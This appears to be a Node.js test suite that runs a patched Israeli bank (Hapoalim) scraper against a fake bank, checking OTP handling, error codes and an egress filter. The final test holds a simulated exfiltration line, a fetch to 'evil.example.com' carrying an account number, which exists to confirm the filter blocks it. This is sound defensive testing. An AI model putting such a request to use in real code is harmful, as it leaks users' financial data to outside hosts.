// End-to-end: the PATCHED israeli-bank-scrapers 6.9.0 hapoalim scraper against a fake bank (no network).
import assert from "node:assert/strict";
import { existsSync } from "node:fs";
import { after, before, describe, test } from "node:test";
import puppeteer from "puppeteer";
import { CompanyTypes, createScraper } from "israeli-bank-scrapers";

import { makePreparePage } from "../lib/egress.mjs";
import { SAFE_LAUNCH_ARGS, fakeBank } from "./fixtures/fake-bank.mjs";

const CHROME = [process.env.CHROMIUM_PATH, "/usr/bin/chromium", "/usr/bin/google-chrome"].find((p) => p && existsSync(p));
const FAKE = { userCode: "FAKEUSER1", password: "fake-Pa55word!" };

let browser;
before(async () => {
  if (!CHROME) return;
  browser = await puppeteer.launch({ headless: true, executablePath: CHROME, args: SAFE_LAUNCH_ARGS });
});
after(async () => browser?.close());

async function run(scenario, { retriever, options = {} } = {}) {
  const bank = fakeBank(scenario);
  const blocked = new Set();
  const calls = [];
  const otpCodeRetriever = retriever === null ? undefined : async (arg) => {
    calls.push(arg);
    return retriever ? retriever(arg) : "246810";
  };
  const context = await browser.createBrowserContext(); // isolated per test; production uses userDataDir
  const scraper = createScraper({
    companyId: CompanyTypes.hapoalim,
    startDate: new Date(Date.now() - 40 * 86400e3),
    browserContext: context,
    skipCloseBrowser: true,
    preparePage: makePreparePage({ blocked, responder: bank.responder }),
    loginTimeout: 8000,
    otpResultTimeout: 4000,
    timeout: 20000,
    defaultTimeout: 20000,
    ...options,
  });
  let result;
  try {
    result = await scraper.scrape({ ...FAKE, ...(otpCodeRetriever ? { otpCodeRetriever } : {}) });
  } finally {
    await context.close().catch(() => {});
  }
  return { result, bank, calls, blocked };
}

describe("patched hapoalim scraper vs fake bank", { skip: !CHROME && "no chromium on this machine" }, () => {
  test("OTP form -> retriever called once -> code typed once -> homepage -> transactions", async () => {
    const { result, bank, calls } = await run({ otp: true });
    assert.equal(result.success, true, JSON.stringify(result));
    assert.equal(calls.length, 1);
    assert.deepEqual(calls[0], { attempt: 1 });
    assert.deepEqual(bank.log.otpSubmissions, ["246810"]);
    assert.deepEqual(bank.log.logins, [{ u: FAKE.userCode, pw: FAKE.password }]);
    assert.equal(result.accounts.length, 1);
    assert.equal(result.accounts[0].txns.length, 2);
    assert.equal(result.accounts[0].txns[0].chargedAmount, -50);
    assert.deepEqual([...bank.log.hosts], ["login.bankhapoalim.co.il"]);
  });

  test("six single-digit inputs are filled digit by digit", async () => {
    const { result, bank } = await run({ otp: true, otpInputs: 6 });
    assert.equal(result.success, true, JSON.stringify(result));
    assert.deepEqual(bank.log.otpSubmissions, ["246810"]);
  });

  test("no OTP asked (trusted profile) -> retriever never called", async () => {
    const { result, calls, bank } = await run({ otp: false });
    assert.equal(result.success, true, JSON.stringify(result));
    assert.equal(calls.length, 0);
    assert.equal(bank.log.otpSubmissions.length, 0);
  });

  test("wrong code -> OTP_REJECTED, exactly one submission, no retry", async () => {
    const { result, bank, calls } = await run({ otp: true }, { retriever: () => "111111" });
    assert.equal(result.success, false);
    assert.match(result.errorMessage, /^OTP_REJECTED:/);
    assert.equal(calls.length, 1);
    assert.deepEqual(bank.log.otpSubmissions, ["111111"]);
    assert.equal(bank.log.logins.length, 1);
    assert.ok(!result.errorMessage.includes("111111"));
  });

  test("relay never delivers -> OTP_TIMEOUT, nothing typed", async () => {
    const err = Object.assign(new Error("no code"), { otpErrorCode: "OTP_TIMEOUT" });
    const { result, bank } = await run({ otp: true }, { retriever: () => { throw err; } });
    assert.equal(result.success, false);
    assert.match(result.errorMessage, /^OTP_TIMEOUT:/);
    assert.equal(bank.log.otpSubmissions.length, 0);
  });

  test("ambiguous codes from the broker keep their reason", async () => {
    const err = Object.assign(new Error("x"), { otpErrorCode: "OTP_AMBIGUOUS" });
    const { result } = await run({ otp: true }, { retriever: () => { throw err; } });
    assert.match(result.errorMessage, /^OTP_AMBIGUOUS:/);
  });

  test("bank shows the OTP form but there is no retriever -> OTP_REQUIRED", async () => {
    const { result } = await run({ otp: true }, { retriever: null });
    assert.equal(result.success, false);
    assert.match(result.errorMessage, /^OTP_REQUIRED:/);
  });

  test("no answer after the code -> OTP_NO_RESULT (single attempt)", async () => {
    const { result, bank } = await run({ otp: true, otpHangs: true });
    assert.match(result.errorMessage, /^OTP_NO_RESULT:/);
    assert.equal(bank.log.otpSubmissions.length, 1);
  });

  test("changed form (selectors) -> OTP_FORM_CHANGED, nothing submitted", async () => {
    const { result, bank } = await run({ otp: true, otpInputs: 3 });
    assert.match(result.errorMessage, /^OTP_FORM_CHANGED:/);
    assert.equal(bank.log.otpSubmissions.length, 0);
  });

  test("otpSelectors override works without re-patching", async () => {
    const { result } = await run({ otp: true }, { options: { otpSelectors: { form: "form.does-not-exist" } } });
    // the form is never recognised -> the stock path: no redirect -> timeout, and the code is never asked for
    assert.equal(result.success, false);
    assert.equal(result.errorType, "TIMEOUT");
  });

  test("invalid password -> INVALID_PASSWORD, retriever not called", async () => {
    const { result, calls } = await run({ otp: true, wrongPasswordFor: FAKE.password });
    assert.equal(result.errorType, "INVALID_PASSWORD");
    assert.equal(calls.length, 0);
  });

  test("egress filter: a third-party host is aborted and recorded (host only)", async () => {
    const bank = fakeBank({ otp: false });
    const blocked = new Set();
    const context = await browser.createBrowserContext();
    const page = await context.newPage();
    await makePreparePage({ blocked, responder: bank.responder })(page);
    await page.goto("https://login.bankhapoalim.co.il/cgi-bin/poalwwwc?reqName=getLogonPage");
    await page.evaluate(() => fetch("https://evil.example.com/x?acct=987654").catch(() => null));
    await context.close();
    assert.deepEqual([...blocked], ["evil.example.com"]);
  });
});
